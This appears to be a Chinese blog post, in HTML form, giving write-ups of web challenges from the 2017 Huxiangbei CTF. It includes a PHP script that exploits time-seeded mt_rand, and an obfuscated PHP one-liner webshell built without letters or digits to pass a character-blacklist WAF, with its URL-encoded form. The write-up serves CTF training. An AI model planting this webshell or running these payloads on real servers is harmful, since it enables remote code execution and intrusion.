@@ -1,0 +1,125 @@
+<!DOCTYPE html><html lang="en"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="与其哀叹，不如埋头苦干"><title>湖湘杯CTF-Web题解 | Mochazz's blog</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script></head><link rel="stylesheet" type="text/css" href="/css/customize.css"><link rel="stylesheet" type="text/css" href="/plugins/prettify/doxy.css"><script type="text/javascript" src="/js/ready.js" async></script><body><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/"></a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/tx.jpeg" width="128" height="128"></a><h1 class="ttl"><a href="/">Mochazz's blog</a></h1></div><p class="m-desc">与其哀叹，不如埋头苦干</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><span class="dot">●</span><span>友链</span><li><span class="dot">●</span><span class="dot">●</span><a href="http://www.lmxspace.com">l1nk3r</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="https://www.virzz.com">Virink</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="http://sec2hack.com">Wfox</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="http://www.lsafe.org">离心</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="https://www.kingkk.com">kingkk</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="http://hpdoger.me">hpdoger</a></li></ul></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">湖湘杯CTF-Web题解</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2017/12/04/hxbctf_web/">2017-12-04</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF竞赛训练/">CTF竞赛训练</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><h3 id="Web150"><a href="#Web150" class="headerlink" title="Web150"></a>Web150</h3><p>.index.php.swp源码如下</p>
+<pre><code>&lt;?php
+    error_reporting(0);
+    $flag = &quot;********************&quot;;
+    echo &quot;please input a rand_num !&quot;;
+    function create_password($pw_length =  10){
+        $randpwd = &quot;&quot;;
+        for ($i = 0; $i &lt; $pw_length; $i++){
+            $randpwd .= chr(mt_rand(100, 200));
+        }
+        return $randpwd;
+    }
+
+    session_start();
+    mt_srand(time());
+    $pwd=create_password();
+    echo $pwd.&apos;||&apos;;    
+
+    if($pwd == $_GET[&apos;pwd&apos;]){
+        echo &quot;first&quot;;
+        if($_SESSION[&apos;userLogin&apos;]==$_GET[&apos;login&apos;])
+            echo &quot;Nice , you get the flag it is &quot;.$flag ;
+    }
+    else{
+        echo &quot;Wrong!&quot;;
+    }
+
+    $_SESSION[&apos;userLogin&apos;]=create_password(32).rand();
+
+?&gt;
+</code></pre><p><a id="more"></a>PHP解题代码如下</p>
+<pre><code>&lt;?php
+    function create_password($pw_length =  10)
+    {
+        $randpwd = &quot;&quot;;
+        for ($i = 0; $i &lt; $pw_length; $i++)
+        {
+            $randpwd .= chr(mt_rand(100, 200));
+        }
+        return $randpwd;
+    }
+
+    for($i=time();$i&lt;time()+5;$i++)
+    {
+        mt_srand($i);
+        $pwd=create_password();
+        $curl=file_get_contents(&quot;http://127.0.0.1/demo.php?pwd=$pwd&amp;login=&quot;);
+        echo $curl.&apos;&lt;br&gt;&apos;;
+    }
+
+?&gt;
+</code></pre><p><img src="/img/hxbctf/image1.png" alt><br>原理大概是这样的，mt_srand()和mt_rand()属于伪随机数，如果给mt_srand()使用了seed，则之后用st_rand()生成的数字是随机的，但是生成数据的顺序却是固定的，例如seed=9时，生成一串数字为9,6,4,4,5,9,8,6,8,0，不管你运行几次，会发现生成的随机数字都是9,6,4,4,5,9,8,6,8,0。<br><img src="/img/hxbctf/image2.png" alt><br>再回到这道题目上，我们只需要预判出之后的pwdb变量的值，之后一直提交即可。至于题目中的第二个判断条件，直接使用login=空即可，因为代码是按顺序执行的，然而<code>$_SESSION[&#39;userLogin&#39;]</code>是在判断之后才定义的，也就是说此时<code>$_SESSION[&#39;userLogin&#39;]</code>根本就还没定义，所以使用NULL绕过即可。PS:这个其实和SQL双查询注入很像</p>
+<h3 id="Web200"><a href="#Web200" class="headerlink" title="Web200"></a>Web200</h3><p>明显题目没出好，正规解题思路是利用filter伪协议读取源代码，然后使用phar伪协议结合文件包含获取flag。<br><img src="/img/hxbctf/image3.png" alt></p>
+<h3 id="Web300"><a href="#Web300" class="headerlink" title="Web300"></a>Web300</h3><pre><code>&lt;?php 
+  ini_set(&quot;display_errors&quot;, &quot;On&quot;); 
+  error_reporting(E_ALL | E_STRICT); 
+  if(!isset($_GET[&apos;content&apos;])){ 
+     show_source(__FILE__); 
+     die(); 
+  } 
+  function rand_string( $length ) { 
+     $chars = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;;     
+     $size = strlen( $chars ); 
+     $str = &apos;&apos;; 
+     for( $i = 0; $i &lt; $length; $i++) { 
+         $str .= $chars[ rand( 0, $size - 1 ) ]; 
+     } 
+     return $str; 
+  } 
+  $data = $_GET[&apos;content&apos;]; 
+  $black_char = array(&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;, &apos;e&apos;, &apos;f&apos;, &apos;g&apos;, &apos;h&apos;, &apos;i&apos;, &apos;j&apos;, &apos;k&apos;, &apos;l&apos;, &apos;m&apos;, &apos;n&apos;, &apos;o&apos;, &apos;p&apos;, &apos;q&apos;, &apos;r&apos;, &apos;s&apos;, &apos;t&apos;, &apos;u&apos;, &apos;v&apos;, &apos;w&apos;, &apos;x&apos;, &apos;y&apos;, &apos;z&apos;,&apos; &apos;, &apos;!&apos;, &apos;&quot;&apos;, &apos;#&apos;, &apos;%&apos;, &apos;&amp;&apos;, &apos;*&apos;, &apos;,&apos;, &apos;-&apos;, &apos;/&apos;, &apos;0&apos;, &apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;7&apos;, &apos;8&apos;, &apos;9&apos;, &apos;:&apos;, &apos;&lt;&apos;, &apos;&gt;&apos;, &apos;?&apos;, &apos;@&apos;, &apos;A&apos;, &apos;B&apos;, &apos;C&apos;, &apos;D&apos;, &apos;E&apos;, &apos;F&apos;, &apos;G&apos;, &apos;H&apos;, &apos;I&apos;, &apos;J&apos;, &apos;K&apos;, &apos;L&apos;, &apos;M&apos;, &apos;N&apos;, &apos;O&apos;, &apos;P&apos;, &apos;Q&apos;, &apos;R&apos;, &apos;S&apos;, &apos;T&apos;, &apos;U&apos;, &apos;V&apos;, &apos;W&apos;, &apos;X&apos;, &apos;Y&apos;, &apos;Z&apos;, &apos;\\&apos;, &apos;^&apos;, &apos;`&apos;,  &apos;|&apos;, &apos;~&apos;);
+  foreach ($black_char as $b) { 
+     if (stripos($data, $b) !== false){ 
+         die(&quot;关键字WAF&quot;); 
+     } 
+  } 
+  $filename=rand_string(0x20).&apos;.php&apos;; 
+  $folder=&apos;uploads/&apos;; 
+  $full_filename = $folder.$filename; 
+  if(file_put_contents($full_filename, &apos;&lt;?php &apos;.$data)){ 
+     echo &quot;&lt;a href=&apos;&quot;.$full_filename.&quot;&apos;&gt;shell&lt;/a&gt;&lt;/br&gt;&quot;; 
+     echo &quot;我的/flag,你读到了么&quot;; 
+  }
+  else{ 
+     echo &quot;噢 噢,错了&quot;; 
+  }
+?&gt;
+</code></pre><p>下面这个是绕WAF的一句话木马，直接通过url写入会失败，原因在于+号会被处理成空格，所以我们需要通过urlencode，将它urlencode写入即可</p>
+<pre><code>&lt;?php 
+  $_=&apos;&apos;.[];$_=$_[&apos;+&apos;==&apos;_&apos;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&apos;_&apos;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);//ASSERT($_POST[_]);
+?&gt;
+</code></pre><p>urlencode之后如下</p>
+<pre><code>%24%5f%3d%27%27%2e%5b%5d%3b%24%5f%3d%24%5f%5b%27%2b%27%3d%3d%27%5f%27%5d%3b%24%5f%5f%5f%3d%24%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%5f%5f%3d%27%5f%27%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%3d%24%24%5f%5f%5f%5f%3b%24%5f%5f%5f%28%24%5f%5b%5f%5d%29%3b
+</code></pre><p><img src="/img/hxbctf/image4.png" alt><br><img src="/img/hxbctf/image5.png" alt><br>参考<br><a href="http://www.freebuf.com/articles/web/138687.html" target="_blank" rel="noopener">通过非数字和字符的方式实现PHP WebShell</a></p>
+<h3 id="Web400"><a href="#Web400" class="headerlink" title="Web400"></a>Web400</h3><p>不会做，也没找到WP</p>
+</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="https://mochazz.github.io">Mochazz</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2017/12/04/hxbctf_web/">https://mochazz.github.io/2017/12/04/hxbctf_web/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://mochazz.github.io">Mochazz的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/CTF/">CTF</a></span></div></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="prev" href="/2017/12/04/08067CTF/">&lt; 08067CTF-Web题解</a><a class="next" href="/2017/12/04/bypass1/">分享几个好玩的过狗一句话 &gt;</a></div><div id="valine-comment"><style type="text/css">.v * { color: #CECECE; }
+.v a { color: #0F9FB4; }
+.v a:hover { color: #216C73; }
+.v li { list-style: inherit; }
+.v .vwrap { border: 1px solid #223441; border-radius: 0; }
+.v .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
+.v .vbtn { border-radius: 0; color: #cecece; background: none; }
+.v .vlist .vcard .vh { border-bottom-color: #293D4E; }
+.v .vwrap .vheader .vinput { border-bottom-color: #223441; }
+.v .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
+.v code, .v pre,.v .vlist .vcard .vhead .vsys { background: #203240; }
+.v .vlist .vcard .vcontent.expand:before { background: linear-gradient(180deg,hsla(206,33%,19%,0),hsla(206,33%,19%,.9)); }
+.v .vlist .vcard .vcontent.expand:after { background: hsla(206,33%,19%,.9); }</style><div id="vcomment"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'cFxDjSziPHq4xGCbSpRGkND7-gzGzoHsz',
+  appKey:'YhJIRxQHzY9Aix5pSGnYxKkv',
+  placeholder:'ヾﾉ≧∀≦)o留下评论再走吧',
+  avatar:'wavatar',
+  guest_info:guest_info,
+  pageSize:'10'
+})</script></div></section><footer><p>Copyright © 2017 - 2019 <a href="/." rel="nofollow">Mochazz's blog</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/plugins/prettify/prettify.js"></script><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"></body></html>
